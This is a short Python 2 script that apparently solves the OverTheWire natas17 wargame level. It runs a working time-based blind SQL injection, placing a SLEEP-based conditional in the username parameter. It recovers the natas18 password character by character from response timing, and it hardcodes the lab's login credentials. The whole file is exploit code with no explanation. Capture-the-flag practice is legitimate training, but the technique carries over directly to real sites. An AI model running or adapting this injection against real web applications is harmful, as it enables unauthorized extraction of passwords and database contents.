import string
import requests

URL = 'http://natas17.natas.labs.overthewire.org/?username=natas18" and if (password like binary "%s%%", sleep(5), null)%%23&debug'
ALPHANUM = string.letters + string.digits
USER_EXISTS = "This user exists"
CREDS = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
SLEEP_SECONDS = 5

s = requests.Session()
s.auth = CREDS

password = ""

while len(password) != 32:
	for letter in ALPHANUM:
		test_password = password + letter
		url = URL % test_password
		data = s.get(url)
		if data.elapsed.total_seconds() > SLEEP_SECONDS:
			password += letter
			print password
			break
